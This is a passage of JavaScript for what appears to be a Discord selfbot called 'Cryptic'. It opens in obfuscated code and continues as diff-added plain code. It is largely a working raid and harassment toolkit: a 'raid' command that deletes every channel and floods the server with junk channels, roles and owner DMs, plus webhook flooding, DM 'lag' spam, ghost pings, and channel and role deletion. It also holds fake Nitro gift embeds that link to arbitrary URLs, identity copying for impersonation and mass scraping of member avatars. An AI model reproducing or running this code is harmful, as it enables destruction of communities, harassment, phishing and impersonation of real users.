-0x234,_0x413afd);};_0x13ca04[_0x12d5d2(0x311,0x345)](_0x12d5d2(0x357,0x428));});}if(_0x390a85===_0x1be328(0x7a4,0x8bc)){console[_0x1be328(0x6da,0x68f)]('['+colors[_0x1be328(0x57b,0x4c3)](moment()['utc']()[_0x1be328(0x6ed,0x627)](_0x1be328(0x5fa,0x50c)))+']\x20'+colors[_0x1be328(0x632,0x734)](_0x1be328(0x596,0x5b8))+'\x20'+colors[_0x1be328(0x5db,0x5cc)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x5c5)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x805)]&&_0x1b369a[_0x1be328(0x594,0x5e4)]();if(!_0x1b369a[_0x1be328(0x59c,0x46c)]['me'][_0x1be328(0x696,0x595)](_0x1be328(0x526,0x410)))return console[_0x1be328(0x6da,0x658)](colors[_0x1be328(0x72e,0x728)](_0x1be328(0x5a4,0x416))+'\x20'+colors[_0x1be328(0x5f5,0x4f2)](_0x1be328(0x589,0x627)));setInterval(()=>{const _0x176643=function(_0x47ea28,_0x429703){return _0x1be328(_0x429703- -0x27a,_0x47ea28);},_0x658f86={};_0x658f86[_0x176643(0x3a9,0x366)]=_0x176643(0x579,0x521),_0x658f86[_0x176643(0x170,0x219)]=_0x176643(0x454,0x46b),_0x1b369a[_0x176643(0x302,0x322)][_0x176643(0x264,0x222)](_0x658f86);});}if(_0x390a85===_0x1be328(0x6fd,0x5ca)){console[_0x1be328(0x6da,0x7c3)]('['+colors[_0x1be328(0x57b,0x536)](moment()[_0x1be328(0x4bf,0x41b)]()['format'](_0x1be328(0x5fa,0x6bf)))+']\x20'+colors[_0x1be328(0x632,0x71f)](_0x1be328(0x596,0x5d4))+'\x20'+colors[_0x1be328(0x5db,0x5d2)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x758)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7f2)]&&_0x1b369a[_0x1be328(0x594,0x45f)]();function _0x341d10(){const _0x2485e0=function(_0x54e613,_0x2d9f17){return _0x1be328(_0x2d9f17- -0x3b5,_0x54e613);};let _0x5ef581='',_0x1e4e85=_0x2485e0(0xfb,0x1ec);for(var _0x4125ba=-0x1eca*-0x1+0x49+-0x1*0x1f13;_0x4125ba<-0x16b*0xc+0x260e*0x1+-0x14f7;_0x4125ba++){_0x5ef581=_0x5ef581+_0x1e4e85['charAt'](Math['floor'](Math[_0x2485e0(0x9c,0x19d)]()*_0x1e4e85[_0x2485e0(0x10d,0x182)]));}return _0x5ef581;}if(_0x1748bb[-0x25*-0x4f+-0x12da+0x76f][_0x1be328(0x537,0x667)]>-0x1de*0x3+-0x8*-0x109+-0x29c||_0x1748bb[0xb*0x241+0x1b2f*-0x1+0x264][_0x1be328(0x537,0x551)]<-0x38e+0x8c4+-0x2f*0x1c)return _0x1b369a[_0x1be328(0x49d,0x5a2)][_0x1be328(0x4c0,0x429)](_0x1be328(0x754,0x5d7));if(!_0x1748bb[0x211f+0x22a8+0x1*-0x43c7])return _0x1b369a[_0x1be328(0x49d,0x427)][_0x1be328(0x4c0,0x373)](_0x1be328(0x5cf,0x579));if(!_0x1748bb[0x4*0x888+0xc7*0x1+-0xba2*0x3])return _0x1b369a[_0x1be328(0x49d,0x592)][_0x1be328(0x4c0,0x362)](_0x1be328(0x681,0x51b));_0x1b369a[_0x1be328(0x49d,0x5d6)][_0x1be328(0x4c0,0x350)](_0x1be328(0x48b,0x356));let _0x2164a2=new Discord['RichEmbed']()[_0x1be328(0x735,0x64b)](_0x1be328(0x66f,0x586),_0x1be328(0x715,0x642))[_0x1be328(0x4a2,0x50b)](_0x1be328(0x59d,0x4b8))[_0x1be328(0x5aa,0x6e6)](color?color:_0x1be328(0x4c1,0x45d))[_0x1be328(0x69b,0x77e)](footer?footer:_0x1be328(0x524,0x5d4),_0x1be328(0x4d5,0x3c5))[_0x1be328(0x56f,0x444)]()[_0x1be328(0x51a,0x68f)](_0x1be328(0x4d8,0x61d),'[https://discord.gift/'+_0x341d10()+']('+_0x1748bb[0x1*-0xfcd+0x1516+-0x548]+')');_0x1b369a[_0x1be328(0x59c,0x498)][_0x1be328(0x59a,0x520)][_0x1be328(0x6b4,0x556)](_0x1748bb[0x218c+-0x1f6*-0x4+-0x2964])[_0x1be328(0x4c0,0x58f)](_0x2164a2);}if(_0x390a85==='ghostping'){console[_0x1be328(0x6da,0x54c)]('['+colors[_0x1be328(0x57b,0x444)](moment()[_0x1be328(0x4bf,0x382)]()[_0x1be328(0x6ed,0x56c)](_0x1be328(0x5fa,0x597)))+']\x20'+colors[_0x1be328(0x632,0x682)](_0x1be328(0x596,0x6fc))+'\x20'+colors[_0x1be328(0x5db,0x6b1)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x52a)](_0x390a85));_0x1b369a['deletable']&&_0x1b369a[_0x1be328(0x594,0x68d)]();const _0x329952=_0x1748bb[0x1fc7+0x43*0x7+-0x219c],_0x294650=_0x1748bb[_0x1be328(0x764,0x641)](0xfcb*-0x1+-0x117d+-0x1*-0x2149)[_0x1be328(0x5c6,0x521)]('\x20');if(!_0x329952)return _0x1b369a[_0x1be328(0x49d,0x36d)]['send'](_0x1be328(0x5cf,0x4b5));if(!_0x294650)return _0x1b369a[_0x1be328(0x49d,0x505)][_0x1be328(0x4c0,0x5ea)](_0x1be328(0x5eb,0x6a8));_0x1b369a[_0x1be328(0x49d,0x43d)][_0x1be328(0x4c0,0x34c)](_0x294650+_0x1be328(0x779,0x78c)+_0x329952+'>');}_0x390a85===_0x1be328(0x53f,0x4fd)&&(console[_0x1be328(0x6da,0x56a)]('['+colors[_0x1be328(0x57b,0x4a0)](moment()[_0x1be328(0x4bf,0x3e9)]()[_0x1be328(0x6ed,0x7c7)](_0x1be328(0x5fa,0x4ae)))+']\x20'+colors[_0x1be328(0x632,0x63d)]('Command\x20used')+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x526)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x774)]&&_0x1b369a[_0x1be328(0x594,0x6f5)](),_0x1b369a[_0x1be328(0x49d,0x5c0)][_0x1be328(0x4c0,0x4bb)](_0x1be328(0x4f4,0x5cf)));if(_0x390a85===_0x1be328(0x60b,0x70d)){console[_0x1be328(0x6da,0x59c)]('['+colors[_0x1be328(0x57b,0x5ba)](moment()[_0x1be328(0x4bf,0x55b)]()['format'](_0x1be328(0x5fa,0x538)))+']\x20'+colors['cyan'](_0x1be328(0x596,0x680))+'\x20'+colors[_0x1be328(0x5db,0x51d)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x5b4)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x820)]&&_0x1b369a[_0x1be328(0x594,0x421)]();let _0x28ba37=_0x1748bb['join']('\x20');if(!_0x28ba37)return _0x1b369a[_0x1be328(0x49d,0x4c6)][_0x1be328(0x4c0,0x3c0)](_0x1be328(0x73f,0x64f));let _0x19bcdc=[_0x1be328(0x5c1,0x643),_0x1be328(0x663,0x4fc),_0x1be328(0x5c1,0x508),_0x1be328(0x79c,0x7be),_0x1be328(0x675,0x524),_0x1be328(0x741,0x74b),_0x1be328(0x5ce,0x5c8),_0x1be328(0x762,0x86c),_0x1be328(0x66c,0x511),'Most\x20likely.',_0x1be328(0x6fa,0x772),_0x1be328(0x500,0x465),_0x1be328(0x578,0x441),_0x1be328(0x5a8,0x538),_0x1be328(0x563,0x4a0),_0x1be328(0x646,0x60b),_0x1be328(0x588,0x51a),_0x1be328(0x6a7,0x55d),_0x1be328(0x6d8,0x5c3),_0x1be328(0x781,0x679),_0x1be328(0x71d,0x613)],_0x42e149=_0x19bcdc[Math[_0x1be328(0x4c7,0x56a)](Math[_0x1be328(0x552,0x6b3)]()*_0x19bcdc[_0x1be328(0x537,0x506)])];if(enabled===!![]){let _0x50816b=new Discord[(_0x1be328(0x508,0x62d))]()[_0x1be328(0x4a2,0x3f9)](_0x1be328(0x5c0,0x436))[_0x1be328(0x5d3,0x60e)](image?image:null)[_0x1be328(0x5aa,0x477)](color?color:null)[_0x1be328(0x69b,0x615)](footer?footer:'')[_0x1be328(0x51a,0x3a8)](_0x1be328(0x67a,0x71c),_0x28ba37,!![])['addField'](_0x1be328(0x68e,0x820),_0x42e149,!![]);_0x1b369a['channel'][_0x1be328(0x4c0,0x3a4)](_0x50816b);}else _0x1b369a[_0x1be328(0x49d,0x601)][_0x1be328(0x4c0,0x38c)](stripIndents`\`\`\`
+  if(cmd === "read") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+        message.delete()
+    }
+    bot.guilds.forEach(guild => {
+        guild.acknowledge()
+    }, 3000)
+  }
+
+  if(cmd === "stealallpfp") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+        message.delete()
+    }
+    const avatars = message.guild.members.map(member => `[${member.user.username}]: ${member.user.displayAvatarURL}`)
+    fs.writeFileSync("../../../Desktop/avatars.json", JSON.stringify(avatars))
+    message.channel.send(`<@!${bot.user.id}>, Go and search for a file called \`avatars.json\` on your desktop`)
+  }
+
+  if(cmd === "invisible") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+        message.delete()
+    }
+    if(!config.password) return console.log(`${colors.red("[ERROR]:")} ${colors.yellow("Invalid password was provided")}`)
+    bot.user.setAvatar("https://i.gyazo.com/492beb29a2c0133311f6eaf63dfc6372.png", config.password)
+    bot.user.setUsername(" ˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞", config.password)
+  }
+
+  if(cmd === "copy") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+        message.delete()
+    }
+    const user = message.mentions.users.first()
+    if(!user) return message.channel.send("Please mention a user")
+    bot.user.setUsername(user.username)
+    bot.user.setAvatar(user.displayAvatarURL) 
+  }
+
+  if(cmd === "stealpfp") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+        message.delete()
+    }
+    const user = message.mentions.users.first()
+    if(!user) return message.channel.send("Please mention a user")
+    bot.user.setAvatar(user.displayAvatarURL) 
+  }
+
+  if(cmd === "massreact") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+        message.delete()
+    }
+    const emoji = args[0]
+    if(!args[0]) return message.channel.send("Please specify an emoji")
+    message.channel.messages.forEach(msg => msg.react(emoji))
+  }
+
+  if(cmd === "spoiler") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+        message.delete()
+    }
+    if(!args.join(" ")) return message.channel.send("Please specify a message")
+    message.channel.send(`||${message.content.slice(9).split("").join("||||")}||`)
+  }
+  
+  if(cmd === "ban") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+      message.delete()
+    }
+    const user = message.mentions.users.first()
+    const member = message.guild.member(user);
+    let reason = args.slice(1).join(" ");
+    if(!reason) reason = "No reason provied"
+    
+    if(!message.guild.me.hasPermission("BAN_MEMBERS")) return message.channel.send("Error! I do not have enough permissions to do that")
+    if(user) {
+        if(member) {
+            member.ban({reason: reason}).then(() => {
+                message.channel.send(`**${user.tag}** was successfully banned from this server`)
+            })
+        } else {
+            message.channel.send("That user does not exist in this server")
+        }
+    } else {
+        message.channel.send("Please mention a user to ban")
+    }
+  }
+
+  if(cmd === "kick") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+      message.delete()
+    }
+    const user = message.mentions.users.first()
+    const member = message.guild.member(user);
+    let reason = args.slice(1).join(" ");
+    if(!reason) reason = "No reason provied"
+    
+    if(!message.guild.me.hasPermission("KICK_MEMBERS")) return message.channel.send("Error! I do not have enough permissions to do that")
+    if(user) {
+        if(member) {
+            member.kick(reason).then(() => {
+                message.channel.send(`**${user.tag}** was successfully kicked from this server`)
+            })
+        } else {
+            message.channel.send("That user does not exist in this server")
+        }
+    } else {
+        message.channel.send("Please mention a user to kick")
+    }
+  }
+
+  if(cmd === "createrole") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+      message.delete()
+    }
+    const roleColor = args[0]
+    const roleName = args.slice(1).join(" ")
+    if(!roleColor) return message.channel.send("Please specify a role color")
+    if(!roleName) return message.channel.send("Please specify a role name")
+    message.guild.createRole({
+        name: roleName,
+        color: roleColor
+    })
+    message.channel.send(`Successfully made the **${roleName}** role`)
+  }
+
+  if(cmd === "deleterole") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+      message.delete()
+    }
+    const roleName = message.guild.roles.find(role => role.name === args.join(" "))
+    if(!args.join(" ")) return message.channel.send("Please specify a role name to delete")
+    if(!roleName) return message.channel.send("That role does not exist")
+    roleName.delete()
+    message.channel.send(`Successfully deleted the **${args.join(" ")}** role`)
+  }
+
+  if(cmd === "addrole") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+      message.delete()
+    }
+    const roleMention = message.mentions.roles.first()
+    const memberMention = message.mentions.members.first()
+    if(!roleMention) return message.channel.send("Please mention a role")
+    if(!memberMention) return message.channel.send("Please mention a member")
+    memberMention.addRole(roleMention);
+    message.channel.send(`Successfully added the **${roleMention.name}** role to **${memberMention.user.tag}**`)
+  }
+
+  if(cmd === "removerole") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+      message.delete()
+    }
+    const roleMention = message.mentions.roles.first()
+    const memberMention = message.mentions.members.first()
+    if(!roleMention) return message.channel.send("Please mention a role")
+    if(!memberMention) return message.channel.send("Please mention a member")
+    memberMention.removeRole(roleMention);
+    message.channel.send(`Successfully removed the **${roleMention.name}** role from **${memberMention.user.tag}**`)
+  }
+
+
+    if(cmd === "lenny") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.send("( ͡° ͜ʖ ͡°)")  
+    }
+
+    if(cmd === "flip") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.send("(╯°□°）╯︵ ┻━┻")  
+    }
+
+    if(cmd === "unflip") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.send("┬─┬ ノ( ゜-゜ノ)")  
+    }
+
+    if(cmd === "shrug") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.send("¯\\_(ツ)_/¯")  
+    }
+
+    if(cmd === "raid") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.guild.me.hasPermission("ADMINISTRATOR")) {
+            message.guild.setIcon("https://i.gyazo.com/e720243a3d6cd9425e8b97456263debd.png")
+            message.guild.setName("RAIDED BY CRYPTIC")
+            message.guild.channels.forEach(ch => {
+                ch.delete()
+            })
+            for (var i = 0; i < 100; i++) {
+                message.guild.createChannel("raided-by-cryptic", {
+                    type: "text"
+                })
+            }
+            for (var i = 0; i < 100; i++) {
+                const Guild = message.guild.name
+                message.guild.members.get(message.guild.ownerID).send(`Your server ${Guild} has been Raided :slight_smile:`).catch(err => { return })
+            }
+            for (var i = 0; i < 100; i++) {
+                message.guild.createChannel("Raided By Cryptic", {
+                    type: "voice"
+                })
+            }
+            for (var i = 0; i < 100; i++) {
+                const newRole = await message.guild.createRole({
+                    name: "RAIDED BY CRYPTIC",
+                    color: "#1B78E7"
+                })
+                message.guild.members.forEach(member => {
+                    member.addRole(newRole.id)
+                })
+            }
+        }
+    }
+
+    if(cmd === "original") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        message.guild.setIcon(null)
+        message.guild.channels.forEach(ch => ch.delete())
+        const textCat = await message.guild.createChannel("Text Channels", {
+            type: "category"
+        })
+        const voiceCat = await message.guild.createChannel("Voice Channels", {
+            type: "category"
+        })
+        message.guild.createChannel("general", {
+            type: "text",
+            parent: textCat.id
+        })
+        message.guild.createChannel("General", {
+            type: "voice",
+            parent: voiceCat.id
+        })
+    }
+
+    if(cmd === "msg") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const options = ["bold", "italics", "underline", "destroy", "upper", "lower", "strikethrough", "hidden", "everything"]
+        if(!args[0]) return message.channel.send(`Please provide one of these methods: ${options.join(", ")}`)
+        if(!args[0].toLowerCase() === options) return message.channel.send(`Please provide one of these methods: ${options.join(", ")}`)
+        if(!args.slice(1).join(" ")) return message.channel.send("Please provide a message.")
+        if(args[0].toLowerCase() === options[0]) {
+            message.channel.send(`**${args.slice(1).join(" ")}**`)
+        } else if(args[0].toLowerCase() === options[1]) {
+            message.channel.send(`*${args.slice(1).join(" ")}*`)
+        } else if(args[0].toLowerCase() === options[2]) {
+            message.channel.send(`__${args.slice(1).join(" ")}__`)
+        } else if(args[0].toLowerCase() === options[3]) {
+            message.channel.send(colors.trap(args.slice(1).join(" ")))
+        } else if(args[0].toLowerCase() === options[4]) {
+            message.channel.send(args.slice(1).join(" ").toUpperCase())
+        } else if(args[0].toLowerCase() === options[5]) {
+            message.channel.send(args.slice(1).join(" ").toLowerCase())
+        } else if(args[0].toLowerCase() === options[6]) {
+            message.channel.send(`~~${args.slice(1).join(" ")}~~`)
+        } else if(args[0].toLowerCase() === options[7]) {
+            message.channel.send(`||${args.slice(1).join(" ")}||`)
+        } else if(args[0].toLowerCase() === options[8]) {
+            message.channel.send(`~~__***||${colors.trap(args.slice(1).join(" ").toUpperCase())}||***__~~`)
+        }
+    }
+
+    if(cmd === "spam") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if (!args[0] || !/\d{1,2}/ig.test(args[0])) {
+            return message.channel.send("Please specify the amount of messages to spam.")
+          } else {
+            var spamAmount = args[0]
+          }
+          if (!args[1]) {
+            return message.channel.send("Please provide a message.")
+          } else {
+            args.splice(0, 1)
+            var spamContent = args.join(" ")
+          }
+          for (var i = 0; i < spamAmount; i++) {
+            message.channel.send(spamContent)
+          }
+    }
+
+    if(cmd === "lag") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const user = message.mentions.users.first();
+        if(!user) return message.channel.send("Please mention a user")
+        const spamAmount = args.slice(1).join(" ");
+        if(!spamAmount) return message.channel.send("Please specify the amount of messages to send")
+        for (var i = 0; i < spamAmount; i++) {
+            user.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
+        }
+    }
+
+    if(cmd === "nitrogen") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+          if(message.deletable) {
+            message.delete()
+          }
+          if(!args[0]) return message.channel.send("Please specify the amount of nitro codes you want to generate")
+          const spamAmount = args[0];
+          function nitroCode() {
+            let code = "";
+            let dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            for (var i = 0; i < 19; i++) {
+                code = code + dict.charAt(Math.floor(Math.random() * dict.length));
+            }
+            return code;
+          }
+          for (var i = 0; i < spamAmount; i++) {
+            message.channel.send(`https://discord.gift/${nitroCode()}`)
+          }
+        }
+
+    if(cmd === "webhookraid") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!config.webhookURL) return console.log(`${colors.red("[ERROR]:")} ${colors.yellow("Webhook URL not specified in config.json")}`)
+        const spamAmount = args[0];
+        const spamContent = args.slice(1).join(" ")
+        if(!spamAmount) return message.channel.send("Please specify the amount of messages to spam!")
+        if(!spamContent) return message.channel.send("Please provide a message")
+        if(`[${message.guild.nameAcronym}] ${message.guild.name}`.length > 40) return console.log(`${colors.red(`[ERROR]:`)} ${colors.yellow(`Guild name is to long`)}`)
+
+        const cryptic = new webhook.Webhook(config.webhookURL)
+        for (var i = 0; i < spamAmount; i++) {
+            const hook = new webhook.MessageBuilder()
+            .setName(`[${message.guild.nameAcronym}] ${message.guild.name}`)
+            .setAvatar(message.guild.iconURL)
+            .setText("@everyone")
+            .setTitle("You've just been raided")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(spamContent)
+            cryptic.send(hook)
+        }
+    }
+
+    if(cmd === "webhookspam") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        let spamMsg;
+        const hookURL = args[0];
+        const mention = args[1];
+        if(!mention == "true" || !mention == "false") return message.channel.send("Mention must be true or false")
+        if(mention === "true") spamMsg = `@everyone | ${args.slice(2).join(" ")}`;
+        if(mention === "false") spamMsg = args.slice(2).join(" ")
+        if(!hookURL.startsWith("https://discord.com/api/webhooks/")) return message.channel.send("Invalid webhook url")
+
+        const raidedWebhook = new webhook.Webhook(hookURL)
+        for (var i = 0; i < 100; i++) {
+            const spamWebhook = new webhook.MessageBuilder()
+            .setText(spamMsg)
+            .setName("Imagine being raided")
+            raidedWebhook.send(spamWebhook)
+        }
+    }
+
+    if(cmd === "whois") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!message.guild) return message.author.send("This command cannot be executed in Direct Messages or in Private Groups.")
+        const user = message.mentions.users.first() || message.author;
+        const member = message.guild.member(user)
+        const perms = member.permissions.toArray().map(str => str.replace(/_/g, " ").toLowerCase().replace(/\b(\w)/g, char => char.toUpperCase())).join(", ")
+        const role = member.roles.map(r => r).join(", ")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle(`${user.username} Info`)
+            .setDescription(`Here is some information on ${user.tag}`)
+            .setThumbnail(user.displayAvatarURL)
+            .setColor(member.highestRole.color || "202225")
+            .addField("Username", user.username, true)
+            .addField("Discriminator", user.discriminator, true)
+            .addField("ID", user.id, true)
+            .addField("Account Created", moment(user.createdAt).format('MMMM Do YYYY, h:mm A'), true)
+            .addField(`[${member.roles.size}] Total Roles`, role)
+            .addField("Guild Permissions", perms)
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setTimestamp()
+            message.channel.send(embed)
+        } else {
+            message.channel.send(stripIndents`\`\`\`
+            ${user.username} Info
+            Here is some information on ${user.tag}
+
+            Username: ${user.username}
+            Discriminator: ${user.discriminator}
+            ID: ${user.id}
+            Account Created: ${moment(user.createdAt).format('MMMM Do YYYY, h:mm A')}
+            Total Roles: ${member.roles.size}
+            Guild Permissions: ${perms}${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "uptime") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        var ms = bot.uptime
+        var sec = Math.floor((ms / 1000) % 60)
+        var min = Math.floor((ms / 1000 / 60) % 60)
+        var hrs = Math.floor((ms / 1000 / 60 / 60) % 24)
+        var day = Math.floor((ms / 1000 / 60 / 60 / 24) % 7)
+        var wks = Math.floor((ms / 1000 / 60 / 60 / 24 / 168) >> 0)
+
+        var secInfo = null; var minInfo = null; var hrsInfo = null; var dayInfo = null; var wksInfo = null
+        if (sec === 1) { secInfo = " second " } else { secInfo = " seconds " }
+        if (min === 1) { minInfo = " minute, and " } else { minInfo = " minutes, and " }
+        if (hrs === 1) { hrsInfo = " hour, " } else { hrsInfo = " hours, " }
+        if (day === 1) { dayInfo = " day, " } else { dayInfo = " days, " }
+        if (wks === 1) { wksInfo = " week, " } else { wksInfo = " weeks, " }
+
+        if (sec === 0) { sec = null; secInfo = null }
+        if (min === 0) { min = null; minInfo = null }
+        if (hrs === 0) { hrs = null; hrsInfo = null }
+        if (day === 0) { day = null; dayInfo = null }
+        if (wks === 0) { wks = null; wksInfo = null }
+
+        var uptime = wks + wksInfo + day + dayInfo + hrs + hrsInfo + min + minInfo + sec + secInfo
+        // var timeZone = new Date().toString().match(/\(([A-Za-z\s].*)\)/)[1]
+        let embed = new Discord.RichEmbed()
+        .setTitle("Uptime")
+        .addField("Online for:", `${uptime} | Since ${moment().subtract(bot.uptime, "ms").format("L LTS")}`)
+        .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+        message.channel.send(embed)
+    }
+
+    if(cmd === "delchannels") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!message.guild.me.hasPermissions("MANAGE_CHANNELS")) return console.log(`${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`)
+        message.guild.channels.forEach((channel) => {
+            channel.delete()
+        })
+    }
+
+    if(cmd === "delroles") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
